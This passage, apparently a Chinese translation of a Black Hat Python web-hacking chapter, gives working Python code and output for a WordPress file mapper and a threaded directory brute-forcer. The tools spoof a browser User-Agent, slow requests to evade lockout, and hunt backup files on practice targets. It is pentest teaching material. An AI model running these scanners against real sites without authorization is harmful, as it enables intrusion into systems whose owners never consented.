class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">FILTERED = [<span class="string">".jpg"</span>, <span class="string">".gif"</span>, <span class="string">".png"</span>, <span class="string">".css"</span>]</span><br><span class="line">[<span class="number">1</span>] TARGET = <span class="string">"http://boodelyboo.com/wordpress"</span></span><br><span class="line">THREADS = <span class="number">10</span></span><br><span class="line">answers = queue.Queue()</span><br><span class="line">[<span class="number">2</span>] web_paths = queue.Queue()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gather_paths</span><span class="params">()</span>:</span></span><br><span class="line">[<span class="number">3</span>] <span class="keyword">for</span> root, _, files <span class="keyword">in</span> os.walk(<span class="string">'.'</span>):</span><br><span class="line">        <span class="keyword">for</span> fname <span class="keyword">in</span> files:</span><br><span class="line">            <span class="keyword">if</span> os.path.splitext(fname)[<span class="number">1</span>] <span class="keyword">in</span> FILTERED:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            path = os.path.join(root, fname)</span><br><span class="line">            <span class="keyword">if</span> path.startswith(<span class="string">'.'</span>):</span><br><span class="line">                path = path[<span class="number">1</span>:]</span><br><span class="line">            print(path)</span><br><span class="line">            web_paths.put(path)</span><br><span class="line"><span class="meta">@contextlib.contextmanager</span></span><br><span class="line">[<span class="number">4</span>] <span class="function"><span class="keyword">def</span> <span class="title">chdir</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    On enter, change directory to specified path.</span></span><br><span class="line"><span class="string">    On exit, change directory back to original.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    this_dir = os.getcwd()</span><br><span class="line">    os.chdir(path)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">    [<span class="number">5</span>] <span class="keyword">yield</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">    [<span class="number">6</span>] os.chdir(this_dir)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">[<span class="number">7</span>] <span class="keyword">with</span> chdir(<span class="string">"/home/tim/Downloads/wordpress"</span>):</span><br><span class="line">        gather_paths()</span><br><span class="line">    input(<span class="string">'Press return to continue.'</span>)</span><br></pre></td></tr></table></figure>

<p>我们首先定义远程目标网站[1]，并创建一个我们对文件指纹不感兴趣的文件扩展名列表。这个列表可以根据目标应用程序的不同而有所不同，但是在本例中，我们选择忽略图像和样式表文件。相反，我们的目标是HTML或文本文件，它们更可能包含对破坏服务器有用的信息。<em>answers</em> 变量是 <em>Queue</em> 对象，我们将在其中放置我们在本地定位的文件路径。<em>web_paths</em> 变量[2]是第二个 <em>Queue</em> 对象，我们将在其中存储试图在远程服务器上定位的文件。在 <em>gather_paths</em> 函数中，我们使用 <em>os.walk</em> 函数[3]遍历本地web应用程序目录中的所有文件和目录。当我们遍历这些文件和目录时，我们构建到目标文件的完整路径，并根据存储在 <em>FILTERED</em> 中的列表来测试它们，以确保我们只寻找我们想要的文件类型。对于我们在本地找到的每个有效文件，我们将其添加到 <em>web_paths</em> 变量的 <em>Queue</em> 中。</p>
<p>需要对 <em>chdir</em> 上下文管理器[4]做一些解释。上下文管理器提供了一种很酷的编程模式，特别是当您可能会健忘或需要记录太多内容并希望简化您的工作时。当你打开了某样东西需要关闭，锁上了某样东西需要打开，或者改变了某样东西需要重置时，你就会发现它们非常有用。您可能熟悉内置的文件管理器，如使用 <em>open</em> 来打开文件或用 <em>socket</em> 来使用套接字。</p>
<p>通常，通过创建具有__enter__和__exit__函数的类来构建上下文管理器。__enter__类函数返回需要管理的资源(如文件或套接字)，而__exit__类函数执行清理操作(例如关闭文件)。</p>
<p>但是，在不需要太多控制的情况下，可以使用 @<em>contextlib.contextmanager</em> 创建一个简单的上下文管理器，将生成器函数转换为上下文管理器。</p>
<p>这个 <em>chdir</em> 函数使您能够在不同的目录中执行代码，并保证在退出时返回到原始目录。<em>chdir</em> 生成器函数通过保存原始目录并更改为新目录来初始化上下文，将控制权返回到 <em>gather_paths</em> [5]，然后恢复到原始目录[6]。</p>
<p>注意，<em>chdir</em> 函数定义包含 <em>try</em> 和 <em>finally</em> 块。您经常会遇到 try/except 语句，但是 try/finally 对不太常见。无论抛出任何异常 finally 块总是会执行。我们在这里需要用到它，因为无论目录更改是否成功，我们都希望上下文恢复到原始目录。try 块的一个简单示例显示了在每种情况下会发生什么:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    something_that_might_cause_an_error()</span><br><span class="line"><span class="keyword">except</span> SomeError <span class="keyword">as</span> e:</span><br><span class="line">    print(e)              <span class="comment"># show the error on the console</span></span><br><span class="line">    dosomethingelse()     <span class="comment"># take some alternative action</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    everything_is_fine()  <span class="comment"># this executes only if the try succeeded</span></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    cleanup()             <span class="comment"># this executes no matter what</span></span><br></pre></td></tr></table></figure>

<p>返回到映射代码，您可以在__main__块中看到，您在with语句[7]中使用了 <em>chdir</em> 上下文管理器，该语句使用要执行代码的目录名称调用生成器。在这个例子中，我们传递了解压WordPress ZIP文件的位置。这个位置在您的机器上是不同的;确保你传入自己的位置。输入 <em>chdir</em> 函数保存当前目录名，并将工作目录更改为函数参数指定的路径。然后，它将控制权返回到执行的主线程，也就是 <em>gather_paths</em> 函数运行的地方。一旦 <em>gather_paths</em> 函数运行完成，我们将退出上下文管理器，执行 <em>finally</em> 子句，工作目录将恢复到原始位置。</p>
<p>当然，您可以使用 <em>os.chdir</em> 手动执行，但是如果您忘记撤消更改，您将发现您的程序在一个意想不到的地方执行。通过使用新的 <em>chdir</em> 上下文管理器，您可以知道您正在正确的上下文中自动工作，并且当您返回时，您又回到了以前的位置。您可以在实用程序中保留此上下文管理器功能，并在其他脚本中使用它。花时间编写像这样的整洁的、方便理解的实用函数以后会有收获的，因为您将会反复使用它们。</p>
<p>执行该程序，沿着WordPress分布层次结构向下走，并查看打印到控制台的完整路径:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(bhp) tim@kali:~/bhp/bhp$ python mapper.py</span><br><span class="line">/license.txt</span><br><span class="line">/wp-settings.php</span><br><span class="line">/xmlrpc.php</span><br><span class="line">/wp-login.php</span><br><span class="line">/wp-blog-header.php</span><br><span class="line">/wp-config-sample.php</span><br><span class="line">/wp-mail.php</span><br><span class="line">/wp-signup.php</span><br><span class="line">--snip--</span><br><span class="line">/readme.html</span><br><span class="line">/wp-includes/class-requests.php</span><br><span class="line">/wp-includes/media.php</span><br><span class="line">/wp-includes/wlwmanifest.xml</span><br><span class="line">/wp-includes/ID3/readme.txt</span><br><span class="line">--snip--</span><br><span class="line">/wp-content/plugins/akismet/_inc/form.js</span><br><span class="line">/wp-content/plugins/akismet/_inc/akismet.js</span><br><span class="line">Press <span class="built_in">return</span> to <span class="built_in">continue</span>.</span><br></pre></td></tr></table></figure>

<p>现在我们的 <em>web_paths</em> 变量的 <em>Queue</em> 充满了要检查的路径。您可以看到我们获得了一些有趣的结果:本地WordPress安装中存在的文件路径，我们可以对一个活跃的目标WordPress应用程序进行测试，包括其中的 <em>.txt*、</em>.js* 和 <em>.xml</em> 文件。当然，您可以在脚本中构建额外的智慧功能，只返回您感兴趣的文件，例如包含单词 <em>install</em> 的文件。</p>
<h3 id="测试活跃目标"><a href="#测试活跃目标" class="headerlink" title="测试活跃目标"></a>测试活跃目标</h3><p>现在已经有了WordPress文件和目录的路径，是时候对它们进行一些操作了——即测试远程目标，看看本地文件系统中找到的哪些文件实际上被安装到了目标上。这些文件是我们在后期可以攻击的，用于强制登录或调查错误配置。让我们将 <em>test_remote</em> 函数添加到 <em>mapper.py</em> 文件中:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_remote</span><span class="params">()</span>:</span></span><br><span class="line">[<span class="number">1</span>] <span class="keyword">while</span> <span class="keyword">not</span> web_paths.empty():</span><br><span class="line">    [<span class="number">2</span>] path = web_paths.get()</span><br><span class="line">        url = <span class="string">f'<span class="subst">&#123;TARGET&#125;</span><span class="subst">&#123;path&#125;</span>'</span></span><br><span class="line">    [<span class="number">3</span>] time.sleep(<span class="number">2</span>)  <span class="comment"># your target may have throttling/lockout.</span></span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        [<span class="number">4</span>] answers.put(url)</span><br><span class="line">            sys.stdout.write(<span class="string">'+'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sys.stdout.write(<span class="string">'x'</span>)</span><br><span class="line">        sys.stdout.flush()</span><br></pre></td></tr></table></figure>

<p><em>test_remote</em> 函数是映射器的主要部分。它在一个循环中运行，该循环将一直执行，直到 <em>web_paths</em> 变量的Queue为空[1]。在循环的每次迭代中，我们从 <em>Queue</em> [2]获取一条路径，将其添加到目标网站的基本路径，然后尝试检索它。如果我们获得成功(由响应代码200指示)，我们将该URL放入 <em>answers</em> 队列中[4]，并在控制台上编写一个+。否则，我们在控制台上写一个x并继续循环。</p>
<p>如果你用请求轰炸一些web服务器，它们就会把你锁在外面(即禁止访问)。这就是为什么我们要用 <em>time.sleep</em> 在每个请求之间等待2秒[3]，这可能会降低我们的请求速度，从而绕过锁定规则。</p>
<p>一旦您知道了目标如何响应，您就可以删除写入控制台的行，但是当您第一次接触目标时，在控制台中写入那些+和x字符有助于您理解运行测试时发生的事情。</p>
<p>最后，我们编写 <em>run</em> 函数作为映射应用程序的入口点:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    mythreads = list()</span><br><span class="line">[<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(THREADS):</span><br><span class="line">        print(<span class="string">f'Spawning thread <span class="subst">&#123;i&#125;</span>'</span>)</span><br><span class="line">    [<span class="number">2</span>] t = threading.Thread(target=test_remote)</span><br><span class="line">        mythreads.append(t)</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> mythreads:</span><br><span class="line">    [<span class="number">3</span>] thread.join()</span><br></pre></td></tr></table></figure>

<p><em>run</em> 函数调用刚刚定义的函数来安排协调映射过程。我们启动10个线程(在脚本开头定义)[1]，并让每个线程运行 <em>test_remote</em> 函数[2]。然后等待所有10个线程完成(使用 <em>thread.join</em> )，然后返回[3]。</p>
<p>现在，我们可以通过向__main__块添加更多的逻辑来完成。用更新后的代码替换文件原来的__main__块:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">[<span class="number">1</span>] <span class="keyword">with</span> chdir(<span class="string">"/home/tim/Downloads/wordpress"</span>):</span><br><span class="line">        gather_paths()</span><br><span class="line">[<span class="number">2</span>] input(<span class="string">'Press return to continue.'</span>)</span><br><span class="line">[<span class="number">3</span>] run()</span><br><span class="line">[<span class="number">4</span>] <span class="keyword">with</span> open(<span class="string">'myanswers.txt'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> answers.empty():</span><br><span class="line">            f.write(<span class="string">f'<span class="subst">&#123;answers.get()&#125;</span>\n'</span>)</span><br><span class="line">    print(<span class="string">'done'</span>)</span><br></pre></td></tr></table></figure>

<p>在调用 <em>gather_paths</em> 之前，我们使用上下文管理器 <em>chdir</em> 导航到正确的目录[1]。我们在那里添加了一个暂停，以便在继续之前查看控制台输出[2]。现在，我们已经从本地安装中收集了有趣的文件路径。然后针对远程应用程序运行主映射任务[3]，并将结果写入文件。我们可能会得到一堆成功的请求，当我们将成功的URL打印到控制台时，结果可能过得太快，我们无法跟上。为了避免这种情况，添加一个块将结果写入文件[4]。请注意打开文件的上下文管理器的类函数。这保证了当块结束时文件关闭。</p>
<h3 id="Kicking-the-Tires"><a href="#Kicking-the-Tires" class="headerlink" title="Kicking the Tires"></a>Kicking the Tires</h3><p>作者保留了一个站点(<a href="boodelyboo.com/">boodelyboo.com/</a>)为了测试用，这就是我们在本例中所要做的。对于您自己的测试，您可以创建一个站点来进行测试，或者您可以将WordPress安装到您的Kali VM中。请注意，您可以使用任何可以快速部署或已经运行的开源web应用程序。当你运行 <em>mapper.py</em> 时，你应该看到如下输出:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Spawning thread 0</span><br><span class="line">Spawning thread 1</span><br><span class="line">Spawning thread 2</span><br><span class="line">Spawning thread 3</span><br><span class="line">Spawning thread 4</span><br><span class="line">Spawning thread 5</span><br><span class="line">Spawning thread 6</span><br><span class="line">Spawning thread 7</span><br><span class="line">Spawning thread 8</span><br><span class="line">Spawning thread 9</span><br><span class="line">++x+x+++x+x++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line">+++++++++++++++++++++</span><br></pre></td></tr></table></figure>

<p>当进程运行结束时，在新文件 <em>myanswers.txt</em> 中列出了搜索成功的路径。</p>
<h2 id="暴力破解目录和文件位置"><a href="#暴力破解目录和文件位置" class="headerlink" title="暴力破解目录和文件位置"></a>暴力破解目录和文件位置</h2><p>前面的示例假定您对目标有很多了解。但是，当你攻击一个定制的web应用程序或大型电子商务系统时，你通常不会知道web服务器上可访问的所有文件。通常，您将部署一个爬虫工具，比如Burp Suite中包含的爬虫工具，来抓取目标网站，以便尽可能多的挖掘分析web应用程序。但是在很多情况下，您将希望获得配置文件、剩余的开发文件、调试脚本和其他可以提供敏感信息或泄露软件开发人员不希望的功能的安全breadcrumbs(面包碎屑，猜测指代细节)。发现这些内容的唯一方法是使用暴力破解工具来查找常见的文件名和目录。</p>
<p>我们将构建一个简单的工具,从通用的暴力破解工具获取单词列表,比如 <em>gobuster</em> (<a href="https://github.com/OJ/gobuster/" target="_blank" rel="noopener">https://github.com/OJ/gobuster/</a>)和 <em>SVNDigger</em> (<a href="https://www.netsparker.com/blog/web-security/svn-digger-better-lists-for-forced-browsing/" target="_blank" rel="noopener">https://www.netsparker.com/blog/web-security/svn-digger-better-lists-for-forced-browsing/</a>),并试图探测目标web服务器的目录和文件。您可以在互联网上找到许多可用的单词列表，并且在您的Kali 发行版中已经有相当多的单词列表(参见 <em>/usr/share/wordlists</em> )。对于本例，我们将使用SVNDigger中的列表。SVNDigger的文件获取方法如下:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/Downloads</span><br><span class="line">wget https://www.netsparker.com/s/research/SVNDigger.zip</span><br><span class="line">unzip SVNDigger.zip</span><br></pre></td></tr></table></figure>

<p>当您解压缩此文件时，文件 <em>all.txt</em> 将位于 <em>Downloads</em> 目录中。</p>
<p>与前面一样，我们将创建一个线程池，以积极地尝试发现内容。让我们首先编写一些从单词列表文件中获取 <em>Queue</em> 的功能函数。打开一个新文件，命名为 <em>bruter.py</em> ，并输入以下代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">AGENT = <span class="string">"Mozilla/5.0 (X11; Linux x86_64; rv:19.0) Gecko/20100101 Firefox/19.0"</span></span><br><span class="line">EXTENSIONS = [<span class="string">'.php'</span>, <span class="string">'.bak'</span>, <span class="string">'.orig'</span>, <span class="string">'.inc'</span>]</span><br><span class="line">TARGET = <span class="string">"http://testphp.vulnweb.com"</span></span><br><span class="line">THREADS = <span class="number">50</span></span><br><span class="line">WORDLIST = <span class="string">"/home/tim/Downloads/all.txt"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_words</span><span class="params">(resume=None)</span>:</span>[<span class="number">1</span>] </span><br><span class="line"></span><br><span class="line">[<span class="number">2</span>] <span class="function"><span class="keyword">def</span> <span class="title">extend_words</span><span class="params">(word)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"."</span> <span class="keyword">in</span> word:</span><br><span class="line">            words.put(<span class="string">f'/<span class="subst">&#123;word&#125;</span>'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        [<span class="number">3</span>] words.put(<span class="string">f'/<span class="subst">&#123;word&#125;</span>/'</span>)</span><br><span class="line">        <span class="keyword">for</span> extension <span class="keyword">in</span> EXTENSIONS:</span><br><span class="line">            words.put(<span class="string">f'/<span class="subst">&#123;word&#125;</span><span class="subst">&#123;extension&#125;</span>'</span>)</span><br><span class="line">    <span class="keyword">with</span> open(WORDLIST) <span class="keyword">as</span> f:</span><br><span class="line">    [<span class="number">4</span>] raw_words = f.read()</span><br><span class="line">    found_resume = <span class="literal">False</span></span><br><span class="line">    words = queue.Queue()</span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> raw_words.split():</span><br><span class="line">    [<span class="number">5</span>] <span class="keyword">if</span> resume <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> found_resume:</span><br><span class="line">                extend_words(word)</span><br><span class="line">            <span class="keyword">elif</span> word == resume:</span><br><span class="line">                found_resume = <span class="literal">True</span></span><br><span class="line">                print(<span class="string">f'Resuming wordlist from: <span class="subst">&#123;resume&#125;</span>'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(word)</span><br><span class="line">            extend_words(word)</span><br><span class="line">[<span class="number">6</span>] <span class="keyword">return</span> words</span><br></pre></td></tr></table></figure>

<p><em>get_words</em> 辅助函数[1]返回我们将在目标上测试的单词队列，它包含一些特殊的技术。我们读入单词列表文件[4]，然后开始遍历文件中的每一行。然后我们将 <em>resume</em> 变量设置为暴力破解尝试的最后一个路径[5]。该功能允许我们在网络连接中断或目标站点宕机时恢复用于破解的网络会话。当我们解析了整个文件后，我们返回一个全是单词的 <em>Queue</em> ，传递给用于真实的暴力破解的功能函数[6]。</p>
<p>注意，这个函数有一个内部函数 <em>extend_words</em> [2]。内部函数是定义在另一个函数内部的函数。我们可以在 <em>get_words</em> 之外编写它，但是因为 <em>extend_words</em> 总是在 <em>get_words</em> 函数的上下文中运行，所以我们将它放在里面，以便保持命名空间整洁并使代码更容易理解。</p>
<p>这个内部函数的目的是在发出请求时应用一个扩展列表进行测试。在某些情况下，您不仅想尝试 <em>/admin</em> 扩展，例如，还想尝试 <em>admin.php</em> 、 <em>admin.inc</em> 和 <em>admin.html</em> [3]。在这里讨论一些开发人员以后可能会在常规编程语言扩展之上使用但忘记删除的常见扩展，比如 <em>.orig</em> 和 <em>.bak</em> ，这些是很有用的。<em>extend_words</em> 内部函数使用以下规则提供了这种功能:如果单词包含一个点(.)，我们将把它附加到URL(例如， <em>/test.php</em> );否则，我们将把它当作目录名(例如 <em>/admin/</em> 。</p>
<p>无论哪种情况，我们都将每个可能的扩展添加到结果中。例如，如果我们有两个单词，<em>test.php</em> 和 <em>admin</em> ，我们将把以下额外的单词放入单词队列:</p>
<p><code>/test.php.bak, /test.php.inc, /test.php.orig, /test.php.php</code></p>
<p><code>/admin/admin.bak, /admin/admin.inc, /admin/admin.orig, /admin/admin.php</code></p>
<p>现在，让我们来编写暴力破解的主功能函数:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dir_bruter</span><span class="params">(words)</span>:</span></span><br><span class="line">[<span class="number">1</span>] headers = &#123;<span class="string">'User-Agent'</span>: AGENT&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> words.empty():</span><br><span class="line">    [<span class="number">2</span>] url = <span class="string">f'<span class="subst">&#123;TARGET&#125;</span><span class="subst">&#123;words.get()&#125;</span>'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url, headers=headers)</span><br><span class="line">    [<span class="number">3</span>] <span class="keyword">except</span> requests.exceptions.ConnectionError:</span><br><span class="line">            sys.stderr.write(<span class="string">'x'</span>);sys.stderr.flush()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        [<span class="number">4</span>] print(<span class="string">f'\nSuccess (<span class="subst">&#123;r.status_code&#125;</span>: <span class="subst">&#123;url&#125;</span>)'</span>)</span><br><span class="line">        <span class="keyword">elif</span> r.status_code == <span class="number">404</span>:</span><br><span class="line">        [<span class="number">5</span>] sys.stderr.write(<span class="string">'.'</span>);sys.stderr.flush()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">f'<span class="subst">&#123;r.status_code&#125;</span> =&gt; <span class="subst">&#123;url&#125;</span>'</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">[<span class="number">6</span>] words = get_words()</span><br><span class="line">    print(<span class="string">'Press return to continue.'</span>)</span><br><span class="line">    sys.stdin.readline()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(THREADS):</span><br><span class="line">        t = threading.Thread(target=dir_bruter, args=(words,))</span><br><span class="line">        t.start()</span><br></pre></td></tr></table></figure>

<p><em>dir_bruter</em> 函数接受一个 <em>Queue</em> 对象，该对象中填充了我们在 <em>get_words</em> 函数中准备的单词。我们在程序开始时定义了一个 <em>User-Agent</em> 字符串，用于HTTP请求，这样我们的请求看起来就像来自正常用户的普通请求一样。我们将该信息添加到 <em>header</em> 变量[1]中。然后循环遍历 <em>word</em> 队列。对于每个迭代，我们创建一个URL，用它向目标应用程序请求[2]，并将请求发送到远程web服务器。</p>
<p>这个函数将一些输出直接打印到控制台，一些输出打印到 <em>stderr</em> 。我们将使用这种技术以一种灵活的方式表示输出。它使我们能够显示输出的不同部分，这取决于我们想看到什么。</p>
<p>(笔者注：stderr：【unix】标准输出(设备)文件，对应终端的屏幕。进程将从标准输入文件中得到输入数据，将正常输出数据输出到标准输出文件，而将错误信息送到标准错误文件中。—百度百科)</p>
<p>如果能知道我们得到的任何连接错误[3]就太好了;当这种情况发生时，打印一个 x 到 <em>stderr*。否则，如果成功(状态为200)，将完整的URL打印到控制台[4]。您也可以创建一个队列并将结果放在那里，就像我们上次所做的那样。如果得到404响应，则向 *stderr</em> 输出一个点(.)，然后继续[5]。如果我们得到任何其他响应代码，我们也打印URL，因为这可能表明远程web服务器上有一些有趣的东西。(也就是说，除了“文件未找到”的错误之外。)关注您的输出情况是很有用的，因为根据远程web服务器的配置，您可能必须过滤掉额外的HTTP错误代码，以清理您的结果。</p>
<p>在 __main__ 块中，我们获得单词列表以暴力破解[6]，然后产生一堆线程来执行破解。</p>
<h3 id="Kicking-the-Tires-1"><a href="#Kicking-the-Tires-1" class="headerlink" title="Kicking the Tires"></a>Kicking the Tires</h3><p>OWASP有一个易受攻击的web应用程序列表，包括在线和离线的，比如虚拟机和磁盘映像，您可以针对这些应用程序测试工具。在本例中，源代码中引用的URL指向 Acunetix 托管的一个故意设有缺陷的web应用程序。攻击这些应用程序最酷的地方在于，它向您展示了暴力破解的有效性。</p>
<p>我们建议您将 <em>THREADS</em> 变量设置为正常的值，比如5，然后运行脚本。值过低将花费很长时间运行，而值过高则会使服务器超载。很快，你就会看到如下结果:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(bhp) tim@kali:~/bhp/bhp$ python bruter.py</span><br><span class="line">Press <span class="keyword">return</span> to <span class="keyword">continue</span>.</span><br><span class="line">--snip--</span><br><span class="line">Success (<span class="number">200</span>: http://testphp.vulnweb.com/CVS/)</span><br><span class="line">...............................................</span><br><span class="line">Success (<span class="number">200</span>: http://testphp.vulnweb.com/admin/).</span><br><span class="line">.......................................................</span><br></pre></td></tr></table></figure>

<p>因为您使用sys.stderr写入 x 和点(.)字符，所以如果您只想看到成功情况，调用脚本并将 <em>stderr</em> 重定向到/dev/null，以便只有你找到的文件显示在控制台上:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">python bruter.py <span class="number">2</span>&gt; /dev/null</span><br><span class="line">Success (<span class="number">200</span>: http://testphp.vulnweb.com/CVS/)</span><br><span class="line">Success (<span class="number">200</span>: http://testphp.vulnweb.com/admin/)</span><br><span class="line">Success (<span class="number">200</span>: http://testphp.vulnweb.com/index.php)</span><br><span class="line">Success (<span class="number">200</span>: http://testphp.vulnweb.com/index.bak)</span><br><span class="line">Success (<span class="number">200</span>: http://testphp.vulnweb.com/search.php)</span><br><span class="line">Success (<span class="number">200</span>: http://testphp.vulnweb.com/login.php)</span><br><span class="line">Success (<span class="number">200</span>: http://testphp.vulnweb.com/images/)</span><br><span class="line">Success (<span class="number">200</span>: http://testphp.vulnweb.com/index.php)</span><br><span class="line">Success (<span class="number">200</span>: http://testphp.vulnweb.com/logout.php)</span><br><span class="line">Success (<span class="number">200</span>: http://testphp.vulnweb.com/categories.php)</span><br></pre></td></tr></table></figure>

<p>请注意，我们正在从远程网站提取一些有趣的结果，其中一些可能会让您感到惊讶。例如，你可能会发现超负荷工作的web开发人员留下的备份文件或代码片段。那个 <em>index.bak</em> 文件里会有什么?有了这些信息，您就可以删除可能为您的应用程序造成危害的文件。</p>
<h2 id="暴力HTML表单验证"><a href="#暴力HTML表单验证" class="headerlink" title="暴力HTML表单验证"></a>暴力HTML表单验证</h2><p>在你的网络黑客生涯中可能会有这样一段时间，你需要访问目标，或者，如果你正在查询，评估现有网络系统的密码强度。web系统对使用暴力破解的保护变得越来越普遍，无论是验证码、简单的数学方程，还是必须与请求一起提交的登录令牌。有许多强力的暴力破解工具可以利用登录脚本执行POST请求，但在很多情况下，它们不够灵活，无法处理动态内容或简单的“您是真人吗?”的检查。</p>
